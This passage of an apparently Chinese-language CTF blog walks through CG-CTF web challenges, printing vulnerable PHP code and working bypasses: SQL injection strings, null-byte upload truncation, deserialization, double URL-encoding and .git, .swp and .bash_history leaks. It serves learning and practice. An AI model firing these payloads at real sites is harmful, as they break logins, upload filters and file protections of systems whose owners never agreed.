+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        extract($_POST);</span><br><span class="line">        if ($pass == $thepassword_123) &#123;</span><br><span class="line">?&gt;</span><br><span class="line">            &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
+<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
+<p>第二个参数 <em>type</em> 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p>
+<p>该函数返回成功导入到符号表中的变量数目。</p>
+<p>所以这道题给pass和thepassword_123用post传一个相同的值即可</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/9.jpg">
+<h2 id="18-php是世界上最好的语言"><a href="#18-php是世界上最好的语言" class="headerlink" title="18.php是世界上最好的语言"></a>18.php是世界上最好的语言</h2><p>这道题链接也挂了，我没答上</p>
+<p>参考一下网上的writeup吧</p>
+<p>index.txt核心代码如下 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>eregi()函数判断id是否为hackerDJ，大小写敏感。网页会拒绝任何含有<code>hackerDJ</code>的提交(忽略大小写)，但接受urldecode后为<code>hackerDJ</code>的字符串。</p>
+<p>因为url在传入后台时会自动先进行一次url解码，所以这里需要二次编码</p>
+<p><code>hackerDJ</code>url编码后为<code>%68%61%63%6b%65%72%44%4a</code></p>
+<p>二次编码后为<code>%2568%2561%2563%256b%2565%2572%2544%254a</code></p>
+<p>其中%25是%的url编码</p>
+<h2 id="19-伪装者"><a href="#19-伪装者" class="headerlink" title="19.伪装者"></a>19.伪装者</h2><p>提示管理系统只能在本地登陆</p>
+<p>改了<code>Referer: 127.0.0.1</code>和<code>X-Forwarded-For: 127.0.0.1</code>都没有成功</p>
+<p>看网上的解释好像是服务端代码有问题</p>
+<p>XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务</p>
+<h2 id="20-header"><a href="#20-header" class="headerlink" title="20.header"></a>20.header</h2><p>链接挂了，flag应该就在数据包的头信息中</p>
+<h2 id="21-上传绕过"><a href="#21-上传绕过" class="headerlink" title="21.上传绕过"></a>21.上传绕过</h2><p>介绍一下文件截断绕过攻击</p>
+<p>1.文件系统0x00截断</p>
+<p>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。 （0x00是16进制值，不可见。） </p>
+<p>2.PHP%00截断</p>
+<p>原理与15题类似，使用方法与文件系统0x00截断相同</p>
+<p>源码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;</span><br><span class="line">enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; </span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>后台应该是dir和file连接</p>
+<p>先尝试上传一个1.jpg文件</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/10.jpg">
+<p>提示上传php文件才行，那上传一个1.php试试</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/11.jpg">
+<p>提示不被允许的文件类型，使用burp抓一个上传文件的包，尝试filename处截断，发现上传仍然失败。</p>
+<p>尝试在目录处截断，成功。</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/12.jpg">
+<p>这个地方尝试截断了好几次，发现直接在重放的Raw中改目录名为”/uploads/1.php0x00”或”/uploads/1.php%00”都没有截断成功，最后是要在Hex中直接改为十六进制的00。</p>
+<p>我的做法是先在Raw中现把filename的值“1.php”改为”1.php.jpg”，然后把dir路径改为 /uploads/1.php+</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/13.jpg">
+<p>我们知道”+”的十六进制值为2b，所以再去Hex中找到+对应的位置把”2b”改成”00”再重新发包。</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/14.jpg">
+<p>传送门：<a href="https://blog.csdn.net/wy_97/article/details/76549761" target="_blank" rel="noopener">其他文件上传绕过姿势</a></p>
+<h2 id="22-SQL注入1"><a href="#22-SQL注入1" class="headerlink" title="22.SQL注入1"></a>22.SQL注入1</h2><p>直接看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  if($query[user]==&quot;admin&quot;) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>会对传入的参数两端去空格，其中sql构建语句为：<code>select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)</code> </p>
+<p>直接post个user闭合单引号和括号，再随便传个pass让它存在就可以了。</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/15.jpg">
+<h2 id="23-pass-check"><a href="#23-pass-check" class="headerlink" title="23.pass check"></a>23.pass check</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$pass=@$_POST[&apos;pass&apos;];</span><br><span class="line">$pass1=***********;//被隐藏起来的密码</span><br><span class="line">if(isset($pass))</span><br><span class="line">&#123;</span><br><span class="line">if(@!strcmp($pass,$pass1))&#123;</span><br><span class="line">echo &quot;flag:nctf&#123;*&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;the pass is wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;please input pass!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>之前提过的php弱类型，strcmp函数在比较失败，即传入数组时会返回null</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/16.jpg">
+<h2 id="24-起名字真难"><a href="#24-起名字真难" class="headerlink" title="24.起名字真难"></a>24.起名字真难</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function noother_says_correct($number)</span><br><span class="line">&#123;</span><br><span class="line">       $one = ord(&apos;1&apos;);</span><br><span class="line">       $nine = ord(&apos;9&apos;);</span><br><span class="line">       for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       return false;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          return $number == &apos;54975581388&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$flag=&apos;*******&apos;;</span><br><span class="line">if(noother_says_correct($_GET[&apos;key&apos;]))</span><br><span class="line">   echo $flag;</span><br><span class="line">else </span><br><span class="line">   echo &apos;access denied&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><code>int ord ( string $string )</code>函数：返回字符串 string 第一个字符的 ASCII 码值</p>
+<p>分析一下代码，这道题需要传入的key参数中不含有1-9的数字但又等于54975581388，考虑编码解决，发现hex(54975581388)刚好等于0xccccccccc</p>
+<p>因此访问url：<a href="http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc</a> 就可以拿到flag辣</p>
+<h2 id="25-密码重置"><a href="#25-密码重置" class="headerlink" title="25.密码重置"></a>25.密码重置</h2><p>tip：重置管理员账号：admin 的密码 </p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/17.jpg">
+<p>burp抓个包看看 </p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/18.jpg">
+<p>放到repeater中把post的user参数改成admin，发现url中get还传了个user1参数，看着像base64编码的，解码发现是ctfuser，所以考虑把user1参数修改为admin经过base64编码后的内容。</p>
+<h2 id="26-php反序列化（暂时无法做）"><a href="#26-php反序列化（暂时无法做）" class="headerlink" title="26.php反序列化（暂时无法做）"></a>26.php反序列化（暂时无法做）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;pass&apos;])) &#123;</span><br><span class="line">    $pass = $_GET[&apos;pass&apos;];</span><br><span class="line">    </span><br><span class="line">    if(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line">    </span><br><span class="line">    if ($o) &#123;</span><br><span class="line">        $o-&gt;secret = &quot;*&quot;;</span><br><span class="line">        if ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;</span><br><span class="line">        else</span><br><span class="line">            echo &quot;Oh no... You can&apos;t fool me&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else echo &quot;are you trolling?&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同 </p>
+<p>对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了 </p>
+<p>在本地写一段代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun&#123;</span><br><span class="line">    var $secret;</span><br><span class="line">    var $enter ;</span><br><span class="line">&#125;</span><br><span class="line">$f=new just4fun();</span><br><span class="line">$f-&gt;enter=&amp;$f-&gt;secret;</span><br><span class="line">$sf=serialize($f);</span><br><span class="line">print_r($sf);</span><br><span class="line"></span><br><span class="line">$usf=unserialize($sf);</span><br><span class="line">echo &apos;&lt;br/&gt;&apos;;</span><br><span class="line">print_r($usf);</span><br></pre></td></tr></table></figure>
+<p>输出如下：</p>
+<p><code>O:8:&quot;just4fun&quot;:2:{s:6:&quot;secret&quot;;N;s:5:&quot;enter&quot;;R:2;}</code></p>
+<p>所以访问</p>
+<p><code>http://localhost/cgctf2.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;}</code></p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/20.jpg">
+<p>php反序列化详细的内容我过几天打完ctf去学php代码审计的时候会整理新的博客的！</p>
+<h2 id="27-SQL-Injection"><a href="#27-SQL-Injection" class="headerlink" title="27.SQL Injection"></a>27.SQL Injection</h2><p>TIP:反斜杠可以用来转义 仔细查看相关函数的用法 </p>
+<p>查看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">	if(get_magic_quotes_gpc())&#123;</span><br><span class="line">		$str=stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">	die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>sql语句：<code>SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;</code></p>
+<p>观察clean函数中的返回值经过htmlentities()函数过滤，这个字符将字符转换为 HTML 转义字符 ，第二个参数如果没有默认只转换双引号，但参数值为ENT_QUOTES时查询文档得知既转换双引号又转换单引号。</p>
+<p>我们最终目标是平衡单引号，可是经过这个函数过滤我们无法输入单引号，只能想怎么消灭原来的单引号。</p>
+<p>构造payload：<code>?username=\&amp;password= or 1#</code>使得查询语句如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1%23&apos;</span><br><span class="line">即</span><br><span class="line">SELECT * FROM users WHERE </span><br><span class="line">name=&apos;\&apos; AND pass=&apos;            『 [name]的值为 [&apos; AND pass=]，单引号被转义了，显然逻辑值为false 』</span><br><span class="line">or 1                           『 但没关系，[false or 1] 的逻辑值为真 』 </span><br><span class="line">%23&apos;                           『 %23是#的url编码，注释掉多余的单引号 』</span><br><span class="line">即</span><br><span class="line">select * from users where false or 1</span><br></pre></td></tr></table></figure>
+<h2 id="28-综合题"><a href="#28-综合题" class="headerlink" title="28.综合题"></a>28.综合题</h2><p>打开后发现是一串看不懂的代码，google一下是jsfuck编码，<a href="http://www.bugku.com/tools/jsfuck/" target="_blank" rel="noopener">在线解码网站</a></p>
+<p>直接拉到控制台执行，得到 1bc29b36f623ba82aaf6724fd3b16718.php</p>
+<p>打开这个网页得到新的提示</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/21.jpg">
+<p>根据提示查看http头信息</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/22.jpg">
+<p>上网搜了一下，发现这是一个linux下保存历史命令的文件，默认保存在/root/.bash_history</p>
+<p>.bash_history详解：<a href="https://yq.aliyun.com/ziliao/75352" target="_blank" rel="noopener">https://yq.aliyun.com/ziliao/75352</a> </p>
+<p>所以尝试打开该目录下这个文件 url：<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></p>
+<p>得到新的提示</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/23.jpg">
+<p>这是一个linux解压缩的命令，访问新的url：<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip可以下载这个压缩文件，用文本编辑器打开该文件得到flag" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip可以下载这个压缩文件，用文本编辑器打开该文件得到flag</a></p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/24.jpg">
+<h2 id="29-system（暂时无法做）"><a href="#29-system（暂时无法做）" class="headerlink" title="29.system（暂时无法做）"></a>29.system（暂时无法做）</h2><p>pass</p>
+<h2 id="30-SQL注入2"><a href="#30-SQL注入2" class="headerlink" title="30.SQL注入2"></a>30.SQL注入2</h2><p>tip：主要考察union查询 </p>
+<p>查看关键源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));</span><br><span class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>strcasecmp(str1, str2)：两个字符串相等则返回0 </p>
+<p>观察一下条件语句 <code>($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))</code></p>
+<p>mysql_fetch_array() 函数返回的关联数组中键为字段名</p>
+<p>构造payload：post一下数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user=&apos; union select &apos;bb23bab64934efa2a4e1666109467f43&apos;#&amp;pass=xiangfeng</span><br><span class="line">//&apos;bb23bab64934efa2a4e1666109467f43&apos;是&apos;xiangfeng&apos;的MD5值</span><br></pre></td></tr></table></figure>
+<p>先用一个单引号把user闭合，然后联合查询xiangfeng的md5值，这样返回的关联数组中pw建的值就是’bb23bab64934efa2a4e1666109467f43’。</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/25.jpg">
+<h2 id="31-综合题2"><a href="#31-综合题2" class="headerlink" title="31.综合题2"></a>31.综合题2</h2><p>见另一篇博客：<a href="https://www.wxylyw.com/2018/11/13/CG-CTF-%E7%BB%BC%E5%90%88%E9%A2%98-2-writeup/" target="_blank" rel="noopener">传送门</a></p>
+<h2 id="32-密码重置2"><a href="#32-密码重置2" class="headerlink" title="32.密码重置2"></a>32.密码重置2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TIPS:</span><br><span class="line">1.管理员邮箱观察一下就可以找到</span><br><span class="line">2.linux下一般使用vi编辑器，并且异常退出会留下备份文件</span><br><span class="line">3.弱类型bypass</span><br></pre></td></tr></table></figure>
+<p>查看网页源代码得到管理员邮箱：</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/26.jpg">
+<p>根据提示，学到一个新知识是<a href="https://www.cnblogs.com/DMDD/p/5052048.html" target="_blank" rel="noopener">非正常关闭vi编辑器时会生成一个.swp文件</a></p>
+<p>查看.index.php.swp和.submit.php.swp文件 </p>
+<p>能打开.submit.php.swp文件，关键代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($token)&amp;&amp;!empty($emailAddress))&#123;</span><br><span class="line">	if(strlen($token)!=10) die(&apos;fail&apos;);</span><br><span class="line">	if($token!=&apos;0&apos;) die(&apos;fail&apos;);</span><br><span class="line">	$sql = &quot;SELECT count(*) as num from `user` where token=&apos;$token&apos; AND email=&apos;$emailAddress&apos;&quot;;</span><br><span class="line">	$r = mysql_query($sql) or die(&apos;db error&apos;);</span><br><span class="line">	$r = mysql_fetch_assoc($r);</span><br><span class="line">	$r = $r[&apos;num&apos;];</span><br><span class="line">	if($r&gt;0)&#123;</span><br><span class="line">		echo $flag;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;失败了呀&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要求token长度为10且token!=0为假，有两种绕过方法，第一种传入token=0000000000绕过，第二种利用弱类型（含有数字内容的字符串也会被转换类型）传入token=0e12345678绕过。</p>
+<h2 id="33-file-get-contents"><a href="#33-file-get-contents" class="headerlink" title="33.file_get_contents"></a>33.file_get_contents</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--$file = $_GET[&apos;file&apos;];</span><br><span class="line">if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123;</span><br><span class="line">    echo $nctf;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure>
+<p>file_get_contents() 函数将整个文件读入一个字符串 </p>
+<p>这里使用第九题中提到的php伪协议之一：”php://input”可以访问请求的原始数据的只读流,，将post请求中的数据作为PHP代码执行。 </p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/27.jpg">
+<h2 id="34-变量覆盖"><a href="#34-变量覆盖" class="headerlink" title="34.变量覆盖"></a>34.变量覆盖</h2><p>代码审计类题目 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--foreach($_GET as $key =&gt; $value)&#123;  </span><br><span class="line">        $$key = $value;  </span><br><span class="line">&#125;  </span><br><span class="line">if($name == &quot;meizijiu233&quot;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure>
+<p>foreach 遍历数组或对象，它会把当前单元的键名也会在每次循环中被赋给变量 $key，值赋给变量$value</p>
+<p>$$ 的意思参考<a href="http://php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">可变变量</a>  </p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/28.jpg">
+<h2 id="35-HateIT"><a href="#35-HateIT" class="headerlink" title="35. HateIT"></a>35. HateIT</h2><p>这道题太难了！我是跟着网上的writeup一步一步复现的，不然自己根本想不到。</p>
+<p>先了解一下web中敏感文件泄露的原因和方法：<a href="https://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html" target="_blank" rel="noopener">传送门</a></p>
+<p>扫描发现robots.txt，admin.php，upload/upload.php，.git/ </p>
+<p>upload/uploa.php不能直接访问，估计是看cookie的 </p>
+<p>使用 <a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 工具将 git 文件下载下来，发现只有一个<code>README.md</code> </p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/dvcs.jpg">
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/catreadme.jpg">
+<p>提示有历史版本，看来得恢复文件，通过<code>git log</code>查看记录 </p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/gitlog.jpg">
+<p>通过<code>git reset</code>回滚版本 </p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/gitreset.jpg">
+<p>拿到了三个通过扩展加密的 php文件和一个txt文件，opcode.txt有index.php，class.php，func.php的 opcode 代码，可以解密这三个php文件。</p>
+<p>看一下robots.txt</p>
